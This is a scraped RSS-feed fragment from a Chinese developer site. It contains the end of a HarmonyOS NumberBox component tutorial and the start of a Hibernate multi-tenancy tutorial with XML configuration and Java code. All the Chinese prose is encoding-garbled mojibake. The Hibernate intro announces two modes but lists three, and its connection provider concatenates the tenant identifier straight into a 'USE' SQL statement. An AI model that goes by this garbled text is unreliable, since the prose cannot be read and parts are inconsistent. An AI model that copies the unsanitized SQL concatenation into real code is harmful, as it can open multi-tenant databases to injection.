}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-15">è·å–è¾“å…¥å€¼</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">inputAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span> }
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">inputText</span> = num
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h2 data-id="heading-16">å±æ€§ä»‹ç»</h2>
<p>å¸¸è§å±æ€§é…ç½®å¦‚ä¸‹ï¼š</p>
















































































<table><thead><tr><th><strong>å±æ€§</strong></th><th><strong>ç±»å‹</strong></th><th><strong>æ¦‚è¿°</strong></th></tr></thead><tbody><tr><td>maxNumber</td><td>number</td><td>æœ€å¤§æ•°é‡</td></tr><tr><td>minNumber</td><td>number</td><td>æœ€å°æ•°é‡ï¼Œé»˜è®¤ä¸º1</td></tr><tr><td>defaultNumber</td><td>number</td><td>é»˜è®¤æ•°é‡ï¼Œé»˜è®¤ä¸º1</td></tr><tr><td>onChange</td><td>(num: number) =&gt; void</td><td>æ•°é‡æ”¹å˜å›è°ƒ</td></tr><tr><td>step</td><td>number</td><td>æ­¥é•¿ï¼Œé»˜è®¤ä¸º1</td></tr><tr><td>minusEnabled</td><td>boolean</td><td>æ˜¯å¦ç¦æ­¢å‡æŒ‰é’®ï¼Œé»˜è®¤falseä¸ç¦æ­¢</td></tr><tr><td>plusEnabled</td><td>boolean</td><td>æ˜¯å¦ç¦æ­¢åŠ æŒ‰é’® ï¼Œé»˜è®¤falseä¸ç¦æ­¢</td></tr><tr><td>inputEnabled</td><td>boolean</td><td>æ˜¯å¦ç¦æ­¢è¾“å…¥æ¡†ç¼–è¾‘ ï¼Œé»˜è®¤falseä¸ç¦æ­¢</td></tr><tr><td>isAutoMinusPlusEnabled</td><td>boolean</td><td>åŠ å‡å·æ˜¯å¦è‡ªåŠ¨ç¦æ­¢,é»˜è®¤falseä¸ç¦æ­¢</td></tr><tr><td>onInputClick</td><td>() =&gt; void</td><td>è¾“å…¥æ¡†ç‚¹å‡»äº‹ä»¶</td></tr><tr><td>onPlusExceed</td><td>() =&gt; void</td><td>ç‚¹å‡»+è¶…è¿‡æœ€å¤§æ•°é‡æ˜¯å¦å›è°ƒï¼Œé»˜è®¤ä¸ºæç¤ºï¼Œè®¾ç½®åï¼Œè‡ªå·±åšå¤„ç†</td></tr><tr><td>onMinusExceed</td><td>() =&gt; void</td><td>ç‚¹å‡»-å°äºæœ€å°æ•°é‡æ˜¯å¦å›è°ƒï¼Œé»˜è®¤ä¸ºæç¤ºï¼Œè®¾ç½®åï¼Œè‡ªå·±åšå¤„ç†</td></tr><tr><td>inputAttribute</td><td>(attr: InputAttribute) =&gt; void</td><td>è¾“å…¥æ¡†å±æ€§è®¾ç½®</td></tr><tr><td>controlAttribute</td><td>(attr: ControlAttribute) =&gt; void</td><td>åŠ å‡æŒ‰é’®å±æ€§è®¾ç½®</td></tr></tbody></table>
<h3 data-id="heading-17">InputAttribute</h3>
<p>è¾“å…¥æ¡†å±æ€§é…ç½®å¦‚ä¸‹</p>




































































































<table><thead><tr><th><strong>å±æ€§</strong></th><th><strong>ç±»å‹</strong></th><th><strong>æ¦‚è¿°</strong></th></tr></thead><tbody><tr><td>width</td><td>Length</td><td>è¾“å…¥æ¡†å®½</td></tr><tr><td>height</td><td>Length</td><td>è¾“å…¥æ¡†é«˜</td></tr><tr><td>fontSize</td><td>Length</td><td>æ–‡å­—å¤§å°</td></tr><tr><td>fontColor</td><td>ResourceColor</td><td>æ–‡å­—é¢œè‰²</td></tr><tr><td>fontWeight</td><td>number / FontWeight / ResourceStr</td><td>æ–‡å­—å­—é‡</td></tr><tr><td>fontStyle</td><td>FontStyle</td><td>æ–‡å­—æ ·å¼</td></tr><tr><td>fontFamily</td><td>ResourceStr</td><td>æ–‡å­—å­—ä½“</td></tr><tr><td>backgroundColor</td><td>ResourceColor</td><td>è¾“å…¥æ¡†èƒŒæ™¯</td></tr><tr><td>marginLeft</td><td>Length</td><td>è¾“å…¥æ¡†è·ç¦»å·¦è¾¹</td></tr><tr><td>marginRight</td><td>Length</td><td>è¾“å…¥æ¡†è·ç¦»å³è¾¹</td></tr><tr><td>padding</td><td>Padding / Length / LocalizedPadding</td><td>è¾“å…¥æ¡†å†…è¾¹è·</td></tr><tr><td>maxLength</td><td>number</td><td>è¾“å…¥æ¡†æœ€å¤§è¾“å…¥é•¿åº¦</td></tr><tr><td>placeholderColor</td><td>ResourceColor</td><td>æç¤ºæ–‡æœ¬é¢œè‰²</td></tr><tr><td>placeholderFontSize</td><td>Length</td><td>æç¤ºæ–‡æœ¬å¤§å°</td></tr><tr><td>placeholderFontWeight</td><td>FontWeight / number / string</td><td>æç¤ºæ–‡æœ¬å­—é‡</td></tr><tr><td>placeholderFontFamily</td><td>string / Resource</td><td>æç¤ºæ–‡æœ¬å­—ä½“</td></tr><tr><td>placeholderFontStyle</td><td>FontStyle</td><td>æç¤ºæ–‡æœ¬æ ·å¼</td></tr><tr><td>border</td><td>BorderOptions</td><td>è¾“å…¥æ¡†è¾¹æ¡†å±æ€§é›†åˆ</td></tr></tbody></table>
<h3 data-id="heading-18">ControlAttribute</h3>
<p>åŠ å‡æŒ‰é’®å±æ€§é…ç½®å¦‚ä¸‹ï¼š</p>




























































<table><thead><tr><th><strong>å±æ€§</strong></th><th><strong>ç±»å‹</strong></th><th><strong>æ¦‚è¿°</strong></th></tr></thead><tbody><tr><td>width</td><td>Length</td><td>æŒ‰é’®å®½åº¦</td></tr><tr><td>height</td><td>Length</td><td>æŒ‰é’®é«˜åº¦</td></tr><tr><td>fontSize</td><td>number /string /Resource</td><td>æŒ‰é’®æ–‡å­—å¤§å°</td></tr><tr><td>backgroundColor</td><td>ResourceColor</td><td>æŒ‰é’®èƒŒæ™¯é¢œè‰²</td></tr><tr><td>fontColor</td><td>ResourceColor</td><td>æŒ‰é’®æ–‡å­—é¢œè‰²</td></tr><tr><td>fontWeight</td><td>number / FontWeight / string</td><td>æŒ‰é’®å­—é‡</td></tr><tr><td>border</td><td>BorderOptions</td><td>æŒ‰é’®è¾¹æ¡†å±æ€§é›†åˆ</td></tr><tr><td>plusMinusEnabledFontColor</td><td>ResourceColor</td><td>åŠ å‡å·ç¦æ­¢ç‚¹å‡»é¢œè‰²</td></tr><tr><td>plusMinusEnabledBgColor</td><td>ResourceColor</td><td>åŠ å‡å·ç¦æ­¢èƒŒæ™¯é¢œè‰²</td></tr><tr><td>plusMinusEnabledBorder</td><td>BorderOptions</td><td>åŠ å‡å·ç¦æ­¢è¾¹æ¡†å±æ€§é›†åˆ</td></tr></tbody></table>
<h2 data-id="heading-19">ç›¸å…³æ€»ç»“</h2>
<p>ç›®å‰çš„æ•°å­—åŠ å‡æ¡†ç»„ä»¶ï¼ŒåŸºæœ¬ä¸Šæ”¯æŒäº†å¤§éƒ¨åˆ†çš„å¸¸è§åœºæ™¯ï¼Œæœ¬èº«å®ç°èµ·æ¥ä¹Ÿä¸å¤æ‚ï¼Œæœ‰éœ€è¦çš„åŒå­¦ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°ä½ ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ55ï¼‰Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒå¦‚ä½•å®ç°ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597635202324807732</link>    <guid>https://juejin.cn/post/7597635202324807732</guid>    <pubDate>2026-01-21T11:54:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324807732" data-draft-id="7597623654056263695" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ55ï¼‰Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒå¦‚ä½•å®ç°ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:54:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ55ï¼‰Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒå¦‚ä½•å®ç°ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:54:41.000Z" title="Wed Jan 21 2026 11:54:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç°ä»£ä¼ä¸šåº”ç”¨ä¸­ï¼Œå¤šç§Ÿæˆ·æ”¯æŒæ˜¯ä¸€ä¸ªé‡è¦çš„éœ€æ±‚ã€‚Hibernateæä¾›äº†å¯¹å¤šç§Ÿæˆ·æ¶æ„çš„æ”¯æŒï¼Œå¯ä»¥ä½¿ä¸€ä¸ªåº”ç”¨ç¨‹åºæ”¯æŒå¤šä¸ªç‹¬ç«‹çš„å®¢æˆ·ï¼ˆç§Ÿæˆ·ï¼‰å…±äº«ä¸€ä¸ªæ•°æ®æºã€‚Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒä¸»è¦æœ‰ä¸¤ç§æ¨¡å¼ï¼š</p>
<ol>
<li><strong>Schema-based å¤šç§Ÿæˆ·</strong>ï¼šæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“æ¨¡å¼ï¼ˆschemaï¼‰ã€‚</li>
<li><strong>Database-based å¤šç§Ÿæˆ·</strong>ï¼šæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“å®ä¾‹ã€‚</li>
<li><strong>Discriminator-based å¤šç§Ÿæˆ·</strong>ï¼šå•ä¸€æ•°æ®åº“å’Œå•ä¸€è¡¨ç»“æ„ï¼Œé€šè¿‡ä¸€ä¸ªç§Ÿæˆ·æ ‡è¯†ç¬¦æ¥åŒºåˆ†ä¸åŒç§Ÿæˆ·çš„æ•°æ®ã€‚</li>
</ol>
<p>ä¸‹é¢å°†è¯¦ç»†ä»‹ç»å¦‚ä½•å®ç°è¿™ä¸‰ç§å¤šç§Ÿæˆ·æ”¯æŒï¼Œç»“åˆä»£ç ç¤ºä¾‹è¯´æ˜ã€‚</p>
<h3 data-id="heading-0">1. Schema-based å¤šç§Ÿæˆ·</h3>
<p>åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“æ¨¡å¼ï¼ˆschemaï¼‰ï¼Œä½†å…±äº«åŒä¸€ä¸ªæ•°æ®åº“å®ä¾‹ã€‚</p>
<h4 data-id="heading-1">é…ç½®Hibernate</h4>
<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- å¤šç§Ÿæˆ·é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multiTenancy"</span>&gt;</span>SCHEMA<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.tenant_identifier_resolver"</span>&gt;</span>com.example.TenantIdentifierResolverImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multi_tenant_connection_provider"</span>&gt;</span>com.example.MultiTenantConnectionProviderImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">å®ç°<code>MultiTenantConnectionProvider</code>æ¥å£</h4>
<p><code>MultiTenantConnectionProvider</code>æ¥å£ç”¨äºæä¾›åŸºäºç§Ÿæˆ·çš„è¿æ¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.engine.jdbc.connections.spi.MultiTenantConnectionProvider;
<span class="hljs-keyword">import</span> org.hibernate.service.spi.Stoppable;

<span class="hljs-keyword">import</span> javax.sql.DataSource;
<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.SQLException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantConnectionProviderImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultiTenantConnectionProvider</span>, Stoppable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DataSource dataSource;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTenantConnectionProviderImpl</span><span class="hljs-params">(DataSource dataSource)</span> {
        <span class="hljs-built_in">this</span>.dataSource = dataSource;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getAnyConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> dataSource.getConnection();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseAnyConnection</span><span class="hljs-params">(Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String tenantIdentifier)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">final</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> getAnyConnection();
        <span class="hljs-keyword">try</span> {
            connection.createStatement().execute(<span class="hljs-string">"USE "</span> + tenantIdentifier);
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HibernateException</span>(<span class="hljs-string">"Could not alter JDBC connection to specified schema ["</span> + tenantIdentifier + <span class="hljs-string">"]"</span>, e);
        }
        <span class="hljs-keyword">return</span> connection;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseConnection</span><span class="hljs-params">(String tenantIdentifier, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.createStatement().execute(<span class="hljs-string">"USE your_default_schema"</span>);
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsAggressiveRelease</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// Implement other required methods...</span>
}
</code></pre>
<h4 data-id="heading-3">å®ç°<code>CurrentTenantIdentifierResolver</code>æ¥å£</h4>
<p><code>CurrentTenantIdentifierResolver</code>æ¥å£ç”¨äºè§£æå½“å‰ç§Ÿæˆ·æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.context.spi.CurrentTenantIdentifierResolver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TenantIdentifierResolverImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CurrentTenantIdentifierResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">resolveCurrentTenantIdentifier</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä»ä¸Šä¸‹æ–‡æˆ–è€…è¯·æ±‚ä¸­è·å–å½“å‰ç§Ÿæˆ·æ ‡è¯†ç¬¦</span>
        <span class="hljs-keyword">return</span> TenantContext.getCurrentTenant();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateExistingCurrentSessions</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h4 data-id="heading-4">å®ä½“ç±»å®šä¹‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„å®ä½“ç±»<code>Product</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-5">ä½¿ç”¨å¤šç§Ÿæˆ·æ”¯æŒ</h4>
<p>åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨å¤šç§Ÿæˆ·æ”¯æŒï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è®¾ç½®å½“å‰ç§Ÿæˆ·</span>
        TenantContext.setCurrentTenant(<span class="hljs-string">"tenant1"</span>);

        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product.setName(<span class="hljs-string">"Product A"</span>);
            product.setPrice(<span class="hljs-number">100.0</span>);
            session.save(product);
            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-6">2. Database-based å¤šç§Ÿæˆ·</h3>
<p>åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“å®ä¾‹ã€‚</p>
<h4 data-id="heading-7">é…ç½®Hibernate</h4>
